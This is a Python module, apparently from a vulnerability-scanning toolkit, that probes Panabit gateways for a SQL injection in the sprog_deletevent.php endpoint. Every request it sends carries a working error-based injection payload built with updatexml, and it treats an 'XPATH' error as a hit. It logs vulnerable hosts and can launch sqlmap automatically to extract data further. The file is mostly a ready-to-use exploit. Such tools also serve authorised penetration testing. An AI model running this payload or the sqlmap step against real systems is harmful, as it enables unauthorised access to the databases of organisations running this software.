#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
urllib3.disable_warnings()


class PanabitSqlScan:

    def run(self, urls):
        url = urls + '/Maintain/sprog_deletevent.php?openid=1&id=1 or updatexml(1,concat(0x7e,(user())),0)&cloudip=1'
        # print(head)
        try:
            response = requests.get(url, headers=self.headers,verify=self.ssl, timeout=5, proxies=self.proxy)
            # print(res_json['yn'])
            if "XPATH" in response.text:
                OutPrintInfo("Panabit", f'存在Panabit-SQL Url: {urls}')
                if self.batch:
                    with open("./result/panabit_sql.txt","a") as w:
                        w.write(f"{urls}\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("Panabit", '不存在Panabit-SQL漏洞')
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("Panabit", '目标请求出错')
            return False

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Panabit", '开始执行Panabit-SQL漏洞检测')
        if self.run(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否调用sqlmap执行检测([b red]y/n[/b red])")
                if choose == "y":
                    import os
                    try:
                        dir = os.getcwd()
                        OutPrintInfo("SqlMap",
                                     f'[b bright_red]Query[/b bright_red]: \n[b magenta]sqlmap -u "{url}/Maintain/sprog_deletevent.php?openid=1&id=1 or updatexml(1,concat(0x7e,(*)),0)&cloudip=1" --output-dir={dir}/result/ --batch')
                        os.system(
                            f"sqlmap -u \"{url}/Maintain/sprog_deletevent.php?openid=1&id=1 or updatexml(1,concat(0x7e,(*)),0)&cloudip=1\" --output-dir={dir}/result/ --batch")
                    except Exception as e:
                        OutPrintInfoErr(e)
        if not self.batch:
            OutPrintInfo("Panabit", 'Panabit-SQL漏洞检测执行结束')